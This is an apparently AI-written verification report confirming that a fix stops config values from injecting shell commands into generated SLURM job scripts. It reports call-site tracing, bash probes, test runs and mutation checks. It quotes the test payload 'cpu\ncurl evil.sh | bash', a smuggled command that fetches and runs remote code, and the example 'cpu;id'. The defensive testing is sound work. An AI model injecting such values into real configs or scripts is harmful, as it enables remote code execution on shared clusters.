# Verification of MAJ-3 closure, decision 0042, commit `d646bb3`

- **Branch:** `task/security-minimal-fix` (checkout C: `verify` at `d646bb3`, parent `3332723`; baseline `fc4749a`)
- **Finding verified:** MAJ-3 in `docs/reviews/security-minimal-fix_review_round2.md` (lines 51-65)
- **Verifier:** an independent fresh context that did not see the producer's conversation.
- **Memory-blindness:** **not memory-blind.** The Glitch session memory (USER.md, MEMORY.md, the auto-memory index) was loaded into this session. None of it is cited as evidence; everything below comes from C or from commands run in C and a scratch directory, which was deleted afterwards.
- **Environment:** macOS, Python 3.13.2, no network.

## Verdict

**MAJ-3 CLOSED.**

All ten wrappers, plus the scaffold template, call `check_config_common` on the same `cfg` before `write_submit_sh` renders the header. A failure returns before anything is written. Nothing else renders `compute.partition/time/cpus/mem` into a script.

In bash, only LF ends a `#SBATCH` comment line, and the set refuses LF and CR. No legitimate value tried was refused. `test_07h` fails at `fc4749a` and passes at `d646bb3`, and all five CI commands exit 0 with 125 tests. The 0042 prose, the Test table row and the commit message match the code. The commit stays in scope.

Severity counts: **BLOCKER 0 · MAJOR 0 · MINOR 1 · NOTE 4.**

## 1. Is it closed end to end?

**Yes.** Every place the header is rendered is listed below.

`executorlib.header_lines` (executorlib.py:250-262) has two callers (`grep -rn header_lines gars tests`):

| Caller | Renders into a script? | Validated? |
|---|---|---|
| `wrapperlib.write_submit_sh` (wrapperlib.py:310-327, writes `submit.sh` at :361) | yes | see the per-wrapper table below |
| `executorlib.main` `header` subcommand (executorlib.py:492-500) | **no.** It prints JSON to stdout (`emit(result, ...)`). `grep -rn "executorlib" gars --include=*.md \| grep -i header` finds no contract telling an agent to paste that output into a script. | n/a |
| `tests/run_tests.py:1538` | test only | n/a |

`wrapperlib.write_submit_sh` is called by exactly 10 wrappers (`ls gars/_system/wrappers` lists 10 directories) and by the scaffold template. In each one, `cmd_prepare` gets `cfg` from `run_checks` in the same call, where `cfg = wl.read_config(...)` is followed straight away by `wl.check_config_common(cfg, REQUIRED_KEYS, fails)`. Then `if fails: return emit(result, EXIT_FAILURE)` ("nothing written"). No code between that return and `write_submit_sh` reassigns `cfg` or its `compute.*` keys; I read every `cmd_prepare` body.

| Wrapper | `check_config_common` | `if fails: return` in prepare | `write_submit_sh` |
|---|---|---|---|
| nfcore-rnaseq | :68 | :142-145 | :167 |
| nfcore-atacseq | :75 | :179-182 | :204 |
| nfcore-chipseq | :72 | :178-181 | :203 |
| nfcore-cutandrun | :69 | :180-183 | :202 |
| nfcore-methylseq | :61 | :108-111 | :130 |
| nfcore-scrnaseq | :119 | :250-253 | :275 |
| nfcore-spatialvi | :101 | :215-218 | :240 |
| rnaseq-de | :196 | :261-264 | :295 |
| scrna-qc-cluster | :273 | :334-337 | :358 |
| spatial-cluster-count | :319 | :369-372 | :390 |
| authoring/create_bioinformatics_skill.py (template emitter) | :337 | :393-397 | :416 |

The only branch that skips `check_config_common` is a missing config file. That branch adds a `preconditions` failure, so prepare returns before writing, and `cfg` is `{}` anyway.

A search for other writers of `#SBATCH` or `submit.sh` in `gars/_system` (`grep -rn "SBATCH\|submit.sh"`) finds only the built-in descriptor strings, `write_submit_sh` itself, and the wrappers' result dicts. `compute.partition`, `compute.time`, `compute.cpus` and `compute.mem` are read nowhere else in `gars/` except `executorlib.py` and `wrapperlib.py`.

**No wrapper renders the header without running `check_config_common` in the same invocation.**

## 2. Is the character set sufficient?

**Yes, for how the shipped descriptors render these values.**

`_fill` (executorlib.py:237-247) is a plain `str.replace`. Every shipped directive line that uses these tokens is a bash comment:

- `SLURM` (executorlib.py:52-62), `#SBATCH --partition={partition}` and the others
- `LOCAL` (executorlib.py:84-90), `# compute.* stays in the record: partition={partition} ...`
- the template `gars/_templates/config/executor.yaml:30-37`

Every descriptor in the tests (run_tests.py:1531, :1763, :1790) is a comment line too. Inside a comment, the only way to reach the shell is to end the line.

Probe 1: a bash script where each `#SBATCH` comment is followed by a candidate line terminator and then `touch <file>`:

```
printf '#!/bin/bash\n#SBATCH --partition=cpu\rtouch .../cr_ran\n ... \x0b ... \x0c ... \xc2\x85 ... \xe2\x80\xa8 ... #SBATCH --partition=cpu\ntouch .../lf_ran\n' > lineend.sh
bash lineend.sh            -> EXIT bash=0
ls scratch | grep _ran     -> lf_ran
```

Only LF ended the comment. CR, VT, FF, U+0085 and U+2028 did not create a command. The refusal set covers LF and CR, which is enough.

Probe 2, the refusal set (`check_config_common({"compute.partition": "cpu"+c+"id"})`): LF, CR, `$`, backtick, `"` and `\` are refused. VT, FF, NEL, LS, PS, NUL, `;`, `|`, `&`, `'`, `(`, `>` and space pass. None of the passing characters ends a comment line in bash (probe 1), so none can execute through a comment directive.

Probe 3, the parser: `wrapperlib.read_config` (wrapperlib.py:47) uses `splitlines()`. A config file whose `partition:` value contains CR, VT, FF, NEL or LS comes back as `'cpu'`, cut at the break. So no line-breaking character can reach `cfg` from the YAML file at all. The new refusal is defence in depth for that path (NOTE-2).

Probe 4, a header rendered with accepted values under `SLURM` and `LOCAL`: no line contains `\n` or `\r`, for example `#SBATCH --partition=cpu_short`.

The non-comment case is MINOR-1.

## 3. Does it refuse any legitimate value?

**No.** Each value below went through `check_config_common({key: v}, (), fails)`, and every one passed:

- partition: `cpu_short`, `gpu-a100`, `cpu_medium`, `cpu_long`, `gpu,cpu`, `a100.q`, `debug`
- time: `12:00:00`, `1-00:00:00`, `2-12`, `30`, `90:00`, `7-00:00:00`, `UNLIMITED`
- cpus: `8`, `1`, `64`
- mem: `64G`, `4000M`, `4000`, `1T`, `500MB`, `64gb`

The template configs ship `cpu_medium`, `cpu_long` and `cpu_short` (`gars/_templates/config/*.yaml`), and all of them pass.

## 4. Tests

| Command (run against C) | Exit | Result |
|---|---|---|
| `python3 C/tests/run_tests.py ExecutorSeamTests` | 0 | `Ran 22 tests`, `OK`; `test_07h_scheduler_values_cannot_break_the_header` is listed |
| `python3 C/tests/run_tests.py` | 0 | `Ran 125 tests in 28.120s`, `OK (skipped=9)` |
| `python3 C/tests/check_contracts.py` | 0 | `14 contracts clean: sections, wait points, vocabulary.` |
| `python3 C/tests/check_counts.py` | 0 | `enforced=3`, `clean — every current claim matches the suite` |
| `python3 C/evals/test_harness.py` | 0 | `Ran 44 tests`, `OK` |
| `python3 C/evals/check_results.py --controls --lexicon` | 0 | `lexicon_cases_task3.json 69 of 69`, `clean — graded=1` |

**Red at `fc4749a`:** `git -C C archive fc4749a | tar -x -C scratch/base`, then copy C's `tests/run_tests.py` into it. That file resolves `GARS` from its own location (run_tests.py:36-39), so it imports the baseline `_system`.

```
python3 scratch/base/tests/run_tests.py ExecutorSeamTests.test_07h_scheduler_values_cannot_break_the_header
AssertionError: False is not true : expected a refusal for compute.partition='cpu\ncurl evil.sh | bash': []
Ran 1 test ... FAILED (failures=1)      EXIT base07h=1
```

**Mutation checks** (a copy of `HEAD` in scratch, one line changed in the new refusal set in `wrapperlib.py`):

- LF removed from the set: `test_07h` goes red (EXIT 1). The test guards LF.
- `"` and `\` removed from the set: `test_07h` stays green (EXIT 0). The test does not guard those two characters (NOTE-1).

## 5. Prose

- **0042 §4 (lines 64-72).** It says "which every wrapper runs" (true, section 1), names the same character set as the code (wrapperlib.py:243-250), says the values are "rendered verbatim by `executorlib.header_lines` into the job script's directive lines" and that "a line break starts a new line the shell executes" (true, probe 1). It also says "No real scheduler value needs any of these characters" (consistent with section 3) and "No job script's bytes change for a legitimate config". That last line holds because the diff adds refusals only and leaves the renderer alone, and the full suite, including the golden-bytes header test, is green. **Accurate.** §4 claims only what the code does: it covers line breaks and expansion, not arbitrary shell metacharacters.
- **The new residual bullet (line 89).** "`directives` and `submit_argv` lines are rendered verbatim; `executorlib.validate()` checks only their `{tokens}` … a session that can write it can put any line into every generated job script." For `directives` this is accurate: `validate()` only checks placeholder names and never requires a directive line to be a comment. For `submit_argv` the wording is loose (NOTE-4). Neither point overclaims the closure.
- **The Test table row (line 110).** "red at `fc4749a` (`compute.partition='cpu\ncurl evil.sh | bash'` not refused)". Reproduced exactly, value included (section 4).
- **The `d646bb3` commit message.** "refuses $, backtick, ", \ and line breaks … the same set as work_dir" matches, since both use `'$`"\\\n\r'`. "test_07h: red at fc4749a (a partition with a line break was not refused), green here. 125 tests; all five CI commands exit 0" is reproduced.

**No MAJOR overclaim found.** The minor inconsistencies are NOTE-3.

## 6. Scope

`git -C C show --stat d646bb3` lists 7 files:

- `gars/_system/wrapperlib.py` (+12, the check only)
- `tests/run_tests.py` (+14, test_07h only)
- `README.md` and `DEVELOPMENT.md` (124 → 125 counts)
- `docs/decisions/0042-…md`
- `docs/decisions/CONTEXT.md` (the 0042 index row)
- `docs/reviews/security-minimal-fix_review_round2.md` (new, 177 lines)

**All within the allowed set.** The index row also adds `wrapperlib.py` to `touches` and the `work_dir` and line-break symptoms, all inside 0042's own scope.

## Findings

### BLOCKER
None.

### MAJOR
None.

### MINOR

**MIN-1: the code comment gives a reason the refusal set does not cover, and that case is not in 0042's residuals.**

wrapperlib.py:239-242 says "a line break starts a new line the shell executes, **and a descriptor may place a value outside a comment**. Same refusal set as work_dir". The set does not protect a value placed outside a comment: `;`, `|`, `&`, `'`, `(`, `>` and space all pass (probe 2). `validate()` does not require directive lines to start with `#`.

So a site-written descriptor with a non-comment line such as `"export P={partition}"` would let an agent-written `compute.partition` value execute, for example `cpu;id`. 0042's residual bullet (line 89) covers a session that *writes the descriptor*. It does not cover a benign descriptor that renders these values outside a comment.

This is not reachable with any shipped or tested descriptor (section 2), so it does not reopen MAJ-3. Fix options: correct the comment and add one clause to the line-89 residual, or require directive lines to be comments in `validate()`.

### NOTE

- **NOTE-1:** `test_07h` does not exercise `"` or `\`. Removing both from the set leaves it green. Its bad values are LF, CR, `$(id)` and a backtick expression.
- **NOTE-2:** `read_config` splits on `splitlines()` (wrapperlib.py:47), so no LF, CR or other line break can reach `cfg` from `_config/<assay>.yaml` (probe 3). The review's MAJ-3 evidence was a dict passed straight to the functions. The new refusal is correct defence in depth, and the prose does not claim otherwise.
- **NOTE-3:** 0042's H1 (line 19) and the index title in CONTEXT.md still end "and work_dir cannot carry shell expansion", and the Migration line (line 76) still says only "A config whose `work_dir` contains one of the refused characters fails `check`". §4 now covers the four scheduler keys too.
- **NOTE-4:** The line-89 bullet says `submit_argv` lines are "rendered verbatim … into every generated job script". `submit_argv` becomes the submit command's argv, not script lines. `validate()` does check that non-builtin `submit_argv` names `{script}`, so "checks only their `{tokens}`" is loose for that key.

Out of scope, one line: whether spaces inside a `#SBATCH` value can inject extra scheduler options is not a shell-execution path and was not tested (no cluster).

## Commands and exit codes (summary)

| Command | Exit |
|---|---|
| clone, checkout `verify` from `origin/task/security-minimal-fix`, remove origin, `log --oneline -3` (d646bb3 on 3332723) | 0 |
| `python3 C/tests/run_tests.py ExecutorSeamTests` | 0 |
| `python3 C/tests/run_tests.py` | 0 (125 tests, skipped=9) |
| `python3 C/tests/check_contracts.py` | 0 |
| `python3 C/tests/check_counts.py` | 0 |
| `python3 C/evals/test_harness.py` | 0 (44 tests) |
| `python3 C/evals/check_results.py --controls --lexicon` | 0 |
| baseline `fc4749a` + C's runner, `test_07h` | 1 (red, as claimed) |
| probe.py (legitimate values, character set, parser, header render) | 0 |
| bash line-ending probe | 0 (only `lf_ran` created) |
| mutation: LF removed, `test_07h` | 1 (killed) |
| mutation: `"` and `\` removed, `test_07h` | 0 (survives, NOTE-1) |

Scratch directory `/Users/javrodher/glitch/_local/eval-scratch/gars-fix-verify3-scratch` deleted at the end. No commits and no git state changes in C beyond setup; this file is the only file created in C.
